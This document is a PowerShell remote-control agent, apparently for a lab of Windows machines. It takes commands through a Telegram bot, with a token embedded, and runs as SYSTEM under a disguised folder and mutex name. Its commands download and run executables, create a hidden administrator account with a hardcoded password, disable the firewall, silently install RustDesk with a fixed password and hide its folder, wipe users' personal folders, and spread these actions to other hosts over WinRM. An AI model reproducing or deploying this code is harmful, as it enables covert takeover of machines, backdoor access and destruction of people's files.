# agent.ps1 - Telegram-controlled agent
# - Runs under SYSTEM (scheduled task)
# - Local commands + WORKGROUP remote commands via hosts.txt
# - /aadmin creates or enables the aadmin account
# - /RemoveAadmin deletes it

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference    = 'SilentlyContinue'

# ============================================================
# CONFIG
# ============================================================
$BOT_TOKEN = '9176710386:AAEVMRpOI3UwYQG-bcerQ8b08nYehk58EOE'
$CHAT_IDS  = @('6716357143','8546050060')

# Local admin account used for remote WinRM to peer machines.
# Set to $null to skip credential use (domain or Kerberos scenarios).
$RemoteUser = 'Administrator'
# ============================================================

$ApiBase    = "https://api.telegram.org/bot$BOT_TOKEN"
$DataDir    = Join-Path $env:LOCALAPPDATA 'Microsoft\Windows\SystemData'
$OffsetFile = Join-Path $DataDir 'offset.txt'
$StatusFile = Join-Path $DataDir 'agent_start.txt'
$HostsFile  = Join-Path $DataDir 'hosts.txt'
$CredFile   = Join-Path $DataDir 'cred.dat'
$MutexName  = 'Global\WinSysDataSvcMutex'

# ---------- single-instance ----------
$createdNew = $false
$mtx = New-Object System.Threading.Mutex($true, $MutexName, [ref]$createdNew)
if (-not $createdNew) { exit }

if (-not (Test-Path $DataDir)) { New-Item -ItemType Directory -Path $DataDir -Force | Out-Null }
if (-not (Test-Path $StatusFile)) { (Get-Date).ToString('o') | Set-Content -Path $StatusFile -Force }

# ---------- helpers ----------
function Send-Tg($chat, $text) {
    if ([string]::IsNullOrWhiteSpace($text)) { $text = '(no output)' }
    try {
        if ($text.Length -gt 4000) { $text = $text.Substring(0,4000) }
        $b = @{ chat_id = $chat; text = $text; parse_mode = 'HTML' }
        Invoke-RestMethod -Uri "$ApiBase/sendMessage" -Method Post -Body $b -TimeoutSec 20 | Out-Null
    } catch {}
}

function Run-PS([string]$script) {
    try {
        $tag = [guid]::NewGuid().ToString('N')
        $ps1 = Join-Path $env:TEMP "rp_$tag.ps1"
        $out = Join-Path $env:TEMP "rp_$tag.txt"
        $err = Join-Path $env:TEMP "rp_$tag.err"
        [IO.File]::WriteAllText($ps1, $script, (New-Object System.Text.UTF8Encoding($false)))
        Start-Process -FilePath 'powershell.exe' `
            -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$ps1`"") `
            -RedirectStandardOutput $out -RedirectStandardError $err `
            -WindowStyle Hidden -Wait
        $o1 = if (Test-Path $out) { Get-Content $out -Raw } else { '' }
        $o2 = if (Test-Path $err) { Get-Content $err -Raw } else { '' }
        Remove-Item $ps1,$out,$err -Force -EA 0
        $all = ("$o1`n$o2").Trim()
        if ($all.Length -gt 3500) { $all = $all.Substring(0,3500) }
        if (-not $all) { return '(no output)' }
        return $all
    } catch { return "ERR: $_" }
}

function Get-Off { if (Test-Path $OffsetFile) { return [long](Get-Content $OffsetFile -Raw).Trim() }; return 0 }
function Set-Off($v) { try { Set-Content -Path $OffsetFile -Value $v -Force } catch {} }

function Get-Cred {
    if (-not $RemoteUser) { return $null }
    if (-not (Test-Path $CredFile)) { return $null }
    try {
        $sec = Get-Content $CredFile | ConvertTo-SecureString
        return New-Object System.Management.Automation.PSCredential($RemoteUser, $sec)
    } catch { return $null }
}

function Invoke-RemoteScript([string]$target, [string]$scriptText) {
    $cred = Get-Cred
    $hasCred = [bool]$cred
    $b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($scriptText))
    $snippet = @"
try {
    `$s = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('$b64'))
    `$params = @{
        ComputerName = '$target'
        ScriptBlock  = { param(`$x) try { Invoke-Expression `$x } catch { 'ERR: ' + `$_ } }
        ArgumentList = @(`$s)
        ErrorAction  = 'Stop'
    }
    if ($([int]$hasCred)) {
        `$sec = Get-Content '$CredFile' | ConvertTo-SecureString
        `$params.Credential = New-Object System.Management.Automation.PSCredential('$RemoteUser', `$sec)
    }
    (Invoke-Command @params 2>&1 | Out-String).Trim()
} catch { 'ERR: ' + `$_ }
"@
    return Run-PS $snippet
}

function Get-LocalStatusReport {
    $now  = Get-Date
    $os   = Get-CimInstance Win32_OperatingSystem -EA 0
    $lastBoot = if ($os) { $os.LastBootUpTime } else { $now }
    $uptime   = $now - $lastBoot
    $ips = Get-NetIPAddress -AddressFamily IPv4 -EA 0 |
           Where-Object { $_.IPAddress -notlike '127.*' -and $_.IPAddress -notlike '169.254.*' } |
           Select-Object -ExpandProperty IPAddress -Unique
    $pub = 'n/a'; try { $pub = (Invoke-RestMethod 'https://api.ipify.org?format=json' -TimeoutSec 4).ip } catch {}
    $agentUp = 'n/a'
    try {
        if (Test-Path $StatusFile) {
            $s = [datetime]::Parse((Get-Content $StatusFile -Raw).Trim())
            $d = $now - $s
            $agentUp = '{0}d {1}h {2}m' -f $d.Days, $d.Hours, $d.Minutes
        }
    } catch {}
    $dfc1 = 'C:\Windows\SysWOW64\DFC.exe'; $dfc2 = 'C:\Windows\System32\DFC.exe'
    $dfcState = if ((Test-Path $dfc1) -or (Test-Path $dfc2)) { 'present' } else { 'missing' }
    $rdSvc = (Get-Service rustdesk -EA 0).Status; if (-not $rdSvc) { $rdSvc = 'not installed' }
    $aa = 'absent'
    $u = Get-LocalUser 'aadmin' -EA 0
    if ($u) {
        $aa = if ($u.Enabled) { 'exists (enabled)' } else { 'exists (disabled)' }
    }
    $lines = @(
        "[ONLINE] $env:COMPUTERNAME",
        "User: $env:USERDOMAIN\$env:USERNAME",
        "OS: $($os.Caption) ($($os.Version))",
        ('Uptime: {0}d {1}h {2}m' -f $uptime.Days, $uptime.Hours, $uptime.Minutes),
        "Agent up: $agentUp",
        "LAN IP: $($ips -join ', ')",
        "Public IP: $pub",
        "RustDesk svc: $rdSvc",
        "DFC: $dfcState",
        "aadmin: $aa",
        "Checked: $($now.ToString('yyyy-MM-dd HH:mm:ss'))"
    )
    return ($lines -join "`n")
}

# ---------- payload scripts ----------
$ScriptInstallDF = '$url="https://github.com/asnake-wian/deploy/raw/refs/heads/main/DF.exe"; $out="$env:TEMP\DF.exe"; Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing; Start-Process -FilePath $out -ArgumentList "/Install" -Wait; Restart-Computer -Force'

# /aadmin — CREATE or ENABLE and ensure admin group membership
$ScriptCreateAadmin = @'
try {
    $u = "aadmin"
    $p = "8100"
    $user = Get-LocalUser $u -ErrorAction SilentlyContinue
    if ($user) {
        if (-not $user.Enabled) {
            Enable-LocalUser $u
            $msg = "Enabled existing user $u"
        } else {
            $msg = "User $u already exists (enabled)"
        }
    } else {
        New-LocalUser $u -Password (ConvertTo-SecureString $p -AsPlainText -Force) -PasswordNeverExpires -ErrorAction Stop | Out-Null
        $msg = "Created user $u (pw: $p)"
    }
    Add-LocalGroupMember -Group Administrators -Member $u -ErrorAction SilentlyContinue
    $inAdmin = (Get-LocalGroupMember -Group Administrators -ErrorAction SilentlyContinue | Where-Object { $_.Name -match "\\$u$" })
    if ($inAdmin) { $msg += " + Administrators" } else { $msg += " (NOT in Administrators)" }
    $msg
} catch { "ERR: $_" }
'@

# /RemoveAadmin — DELETE
$ScriptRemoveAadmin = @'
try {
    $u = "aadmin"
    if (Get-LocalUser $u -ErrorAction SilentlyContinue) {
        Disable-LocalUser $u -ErrorAction SilentlyContinue
        Remove-LocalGroupMember -Group Administrators -Member $u -ErrorAction SilentlyContinue
        Remove-LocalUser $u -ErrorAction SilentlyContinue
        "Removed user $u"
    } else {
        "User $u not found"
    }
} catch { "ERR: $_" }
'@

$ScriptThawed = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTTHAWED 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'
$ScriptFrozen = 'try { $dfc="C:\Windows\SysWOW64\DFC.exe"; if(!(Test-Path $dfc)){$dfc="C:\Windows\System32\DFC.exe"}; if(Test-Path $dfc){ (& $dfc "Abel@101" /BOOTFROZEN 2>&1 | Out-String).Trim() } else { "DFC_NOT_FOUND" } } catch { "ERR: $_" }'

$ScriptInstallRustPhase1 = 'Start-Job -ScriptBlock { netsh advfirewall set allprofiles state off; $u="https://github.com/rustdesk/rustdesk/releases/download/1.3.7/rustdesk-1.3.7-x86_64.exe"; $o="$env:TEMP\rd.exe"; Invoke-WebRequest $u -OutFile $o -UseBasicParsing; Start-Process $o -ArgumentList "--silent-install","--install-service","--no-shortcut","--disable-printer" -Wait } | Wait-Job -Timeout 120 | Receive-Job'

$ScriptInstallRustPhase2 = 'try { $rd="C:\Program Files\RustDesk\RustDesk.exe"; if(Test-Path $rd){ $d=Split-Path $rd; attrib -h -s $d 2>$null; Start-Process $rd -ArgumentList "--password","Abel@123" -NoNewWindow -Wait -EA 0; Start-Sleep 5; taskkill /F /IM RustDesk.exe /T 2>$null | Out-Null; sc.exe start rustdesk 2>$null | Out-Null; Start-Sleep 3; $tmp=Join-Path $env:TEMP ("rid_" + [guid]::NewGuid().ToString("N") + ".txt"); & $rd --get-id *> $tmp; $id=(Get-Content $tmp -Raw -EA 0); Remove-Item $tmp -Force -EA 0; $id=if($id){$id.Trim()}else{""}; if($id -match "(\d{6,})"){$id=$matches[1]}else{$id="ID_NOT_FOUND"}; attrib +h +s $d 2>$null; "IDF03: $id`nPW: Abel@123" } else { "RUSTDESK_NOT_INSTALLED" } } catch { "ERR: $_" }'

$ScriptUninstallRust = 'Start-Job -ScriptBlock { taskkill /F /IM RustDesk.exe /T 2>$null; sc.exe stop rustdesk 2>$null; sc.exe delete rustdesk 2>$null; $up=@("${env:ProgramFiles}\RustDesk\uninstall.exe","${env:ProgramFiles(x86)}\RustDesk\uninstall.exe","$env:LOCALAPPDATA\Programs\RustDesk\uninstall.exe","$env:APPDATA\RustDesk\uninstall.exe"); $u=$up|Where-Object{Test-Path $_}|Select-Object -First 1; if($u){Start-Process $u -ArgumentList "/S" -Wait} } | Wait-Job -Timeout 60 | Receive-Job'

$ScriptUninstallOld = '$u="https://github.com/asnake-wian/deploy/raw/refs/heads/main/DFStd.exe";$o="$env:TEMP\DFStd.exe";Invoke-WebRequest -Uri $u -OutFile $o;Start-Process -FilePath $o -ArgumentList "/Uninstall" -Wait'

$ScriptReset = '$e=@("This PC.lnk","Recycle Bin.lnk","Microsoft Edge.lnk","Google Chrome.lnk","WPS PDF.lnk","WPS Office.lnk","Safe Exam Browser.lnk"); Get-ChildItem "C:\Users" -Directory -EA 0 | Where-Object { $_.Name -notin @("Public","Default","Default User","All Users") -and (Test-Path "$($_.FullName)\Desktop") } | ForEach-Object { $u=$_.FullName; Get-ChildItem (Join-Path $u "Desktop") -Force -EA 0 | Where-Object { $_.Name -notin $e } | Remove-Item -Recurse -Force -EA 0; foreach($f in @("Downloads","Pictures","Documents","Videos")){ $p=Join-Path $u $f; if(Test-Path $p){ Get-ChildItem $p -Force -EA 0 | Remove-Item -Recurse -Force -EA 0 } } }; Get-ChildItem "C:\Users\Public\Desktop" -Force -EA 0 | Where-Object { $_.Name -match "RustDesk" } | Remove-Item -Recurse -Force -EA 0; Clear-RecycleBin -Force -EA 0'

$ScriptID = @'
try {
    $rp = @(
        'C:\Program Files\RustDesk\rustdesk.exe',
        'C:\Program Files (x86)\RustDesk\rustdesk.exe',
        'C:\Program Files\SafeExamBrowser\Application\locales\RustDesk\rustdesk.exe',
        "$env:LOCALAPPDATA\RustDesk\rustdesk.exe"
    )
    $p = $null
    foreach ($x in $rp) { if (Test-Path $x) { $p = $x; break } }
    if (-not $p) { return 'RUSTDESK_NOT_FOUND' }
    $d = Split-Path $p
    attrib -h -s $d 2>$null
    Start-Process $p -ArgumentList '--password','Abel@123' -NoNewWindow -Wait -EA 0
    Start-Sleep 2
    $tmp = Join-Path $env:TEMP ("rid_" + [guid]::NewGuid().ToString('N') + '.txt')
    & $p --get-id *> $tmp
    $id = (Get-Content $tmp -Raw -EA 0)
    Remove-Item $tmp -Force -EA 0
    $id = if ($id) { $id.Trim() } else { '' }
    if ($id -match '(\d{6,})') { $id = $matches[1] } else { $id = 'ID_NOT_FOUND' }
    attrib +h +s $d 2>$null
    return "IDF03: $id`nPW: Abel@123"
} catch { return "ERR: $_" }
'@

# ---------- resolve targets ----------
function Get-Targets {
    if (-not (Test-Path $HostsFile)) { return @() }
    Get-Content $HostsFile | ForEach-Object {
        $l = $_.Trim()
        if ($l -and -not $l.StartsWith('#')) { $l }
    } | Where-Object { $_ -and ($_ -ine $env:COMPUTERNAME) }
}

# ---------- main loop ----------
$offset = Get-Off
while ($true) {
    try {
        $upd = Invoke-RestMethod -Uri "$ApiBase/getUpdates?offset=$offset&timeout=25" -TimeoutSec 40
        foreach ($u in $upd.result) {
            $offset = [long]$u.update_id + 1
            Set-Off $offset
            if (-not $u.message) { continue }
            $cid = "$($u.message.chat.id)"
            if ($CHAT_IDS -notcontains $cid) { continue }
            $t = "$($u.message.text)".Trim()
            if (-not $t) { continue }

            # ---------- /status [host] ----------
            if ($t -match '^/status\b\s*(.*)$') {
                $arg = $matches[1].Trim()
                if (-not $arg -or $arg -ieq $env:COMPUTERNAME) {
                    Send-Tg $cid (Get-LocalStatusReport)
                } else {
                    Send-Tg $cid ("STATUS -> $arg`n" + (Invoke-RemoteScript $arg 'try { $now=Get-Date; $os=Get-CimInstance Win32_OperatingSystem -EA 0; $ub=$os.LastBootUpTime; $up=$now-$ub; $ips=(Get-NetIPAddress -AddressFamily IPv4 -EA 0|Where-Object{$_.IPAddress -notlike "127.*" -and $_.IPAddress -notlike "169.254.*"}|Select-Object -ExpandProperty IPAddress -Unique) -join ", "; "[ONLINE] $env:COMPUTERNAME`nUser: $env:USERDOMAIN\$env:USERNAME`nOS: $($os.Caption) ($($os.Version))`nUptime: {0}d {1}h {2}m`nLAN IP: $ips" -f $up.Days,$up.Hours,$up.Minutes } catch { "ERR: $_" }'))
                }
                continue
            }

            # ---------- /ID ----------
            if ($t -match '^/ID\b') {
                Send-Tg $cid (Run-PS $ScriptID)
                continue
            }

            # ---------- /InstallDF [all|host|local] ----------
            if ($t -match '^/InstallDF(?:\s+(.+))?$') {
                $tg = if ($matches[1]) { $matches[1].Trim() } else { $env:COMPUTERNAME }
                if ($tg -ieq 'all') {
                    $targets = Get-Targets
                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries. Create $HostsFile with one hostname per line."; continue }
                    $out = @("Local: " + (Run-PS $ScriptInstallDF))
                    foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptInstallDF) }
                    Send-Tg $cid ("InstallDF ALL`n" + ($out -join "`n"))
                } elseif ($tg -ieq $env:COMPUTERNAME) {
                    Send-Tg $cid ("InstallDF local -> " + (Run-PS $ScriptInstallDF))
                } else {
                    Send-Tg $cid ("InstallDF -> $tg`n" + (Invoke-RemoteScript $tg $ScriptInstallDF))
                }
                continue
            }

            # ---------- /aadmin [all|host|local] — CREATE / ENABLE ----------
            if ($t -match '^/aadmin(?:\s+(.+))?$') {
                $tg = if ($matches[1]) { $matches[1].Trim() } else { $env:COMPUTERNAME }
                if ($tg -ieq 'all') {
                    $targets = Get-Targets
                    if (-not $targets) { Send-Tg $cid "No hosts.txt entries. Create $HostsFile with one hostname per line."; continue }
                    $out = @("Local: " + (Run-PS $ScriptCreateAadmin))
                    foreach ($h in $targets) { $out += "$h : " + (Invoke-RemoteScript $h $ScriptCreateAadmin) }
                    Send-Tg $cid ("aadmin ALL`n" + ($out -join "`n"))
                } elseif ($tg -ieq $env:COMPUTERNAME) {
                    Send-Tg $cid ("aadmin local -> " + (Run-PS $ScriptCreateAadmin))
                } else {
                    Send-Tg $cid ("aadmin -> $tg`n" + (Invoke-RemoteScript $tg $ScriptCreateAadmin))
                }
                continue
            }

            # ---------- /RemoveAadmin — DELETE ----------
            if ($t -match '^/RemoveAadmin\b') {
                Send-Tg $cid ("RemoveAadmin -> " + (Run-PS $ScriptRemoveAadmin))
                continue
            }

            if ($t -match '^/Thawed\b') {
                Send-Tg $cid ("Thawed -> " + (Run-PS $ScriptThawed))
                continue
            }

            if ($t -match '^/Froozen\b') {
                Send-Tg $cid ("Frozen -> " + (Run-PS $ScriptFrozen))
                continue
            }

            if ($t -match '^/InstallRust\b') {
                Send-Tg $cid 'InstallRust started...'
                Run-PS $ScriptInstallRustPhase1 | Out-Null
                Send-Tg $cid (Run-PS $ScriptInstallRustPhase2)
                continue
            }

            if ($t -match '^/UninstallRust\b') {
                Run-PS $ScriptUninstallRust | Out-Null
                Send-Tg $cid 'UninstallRust done.'
                continue
            }

            if ($t -match '^/UninstallOld\b') {
                Run-PS $ScriptUninstallOld | Out-Null
                Send-Tg $cid 'UninstallOld done.'
                continue
            }

            if ($t -match '^/Reset\b') {
                Run-PS $ScriptReset | Out-Null
                Send-Tg $cid "Reset done on $env:COMPUTERNAME"
                continue
            }

            Send-Tg $cid "Unknown: $t"
        }
    } catch { Start-Sleep 5 }
}
